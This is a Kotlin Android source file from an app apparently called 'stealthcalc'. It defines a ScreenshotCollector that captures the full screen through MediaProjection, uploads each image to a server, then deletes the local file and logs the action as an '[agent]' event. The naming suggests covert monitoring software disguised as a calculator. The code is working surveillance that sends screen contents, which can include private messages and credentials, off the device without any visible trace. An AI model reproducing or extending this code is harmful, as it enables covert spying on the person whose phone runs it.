package com.stealthcalc.monitoring.collector

import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.util.DisplayMetrics
import android.view.WindowManager
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.network.FileUploader
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class ScreenshotCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
    private val uploader: FileUploader,
) {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null

    val isActive: Boolean get() = mediaProjection != null

    fun setMediaProjection(resultCode: Int, data: Intent) {
        val manager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = manager.getMediaProjection(resultCode, data)
    }

    @SuppressLint("WrongConstant")
    suspend fun captureScreenshot(): Boolean = withContext(Dispatchers.IO) {
        if (!repository.isMetricEnabled("screenshots")) return@withContext false
        val projection = mediaProjection ?: return@withContext false

        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(metrics)

        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        val reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        imageReader = reader

        val display = projection.createVirtualDisplay(
            "screenshot",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            reader.surface,
            null, null
        )
        virtualDisplay = display

        kotlinx.coroutines.delay(500)

        val image = reader.acquireLatestImage()
        if (image == null) {
            display.release()
            reader.close()
            return@withContext false
        }

        val plane = image.planes[0]
        val buffer = plane.buffer
        val pixelStride = plane.pixelStride
        val rowStride = plane.rowStride
        val rowPadding = rowStride - pixelStride * width

        val bitmap = Bitmap.createBitmap(
            width + rowPadding / pixelStride, height,
            Bitmap.Config.ARGB_8888
        )
        bitmap.copyPixelsFromBuffer(buffer)
        image.close()
        display.release()
        reader.close()

        val cropped = if (bitmap.width > width) {
            Bitmap.createBitmap(bitmap, 0, 0, width, height).also {
                if (it !== bitmap) bitmap.recycle()
            }
        } else bitmap

        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val file = File(context.cacheDir, "screenshot_$timestamp.jpg")
        file.outputStream().use { out ->
            cropped.compress(Bitmap.CompressFormat.JPEG, 80, out)
        }
        cropped.recycle()

        val success = uploader.uploadFile(
            file = file,
            mimeType = "image/jpeg",
            category = "screenshot",
            capturedAt = System.currentTimeMillis(),
        )
        file.delete()

        if (success) {
            AppLogger.log(context, "[agent]", "Screenshot captured and uploaded")
        }
        success
    }

    fun release() {
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()
        mediaProjection = null
        virtualDisplay = null
        imageReader = null
    }
}
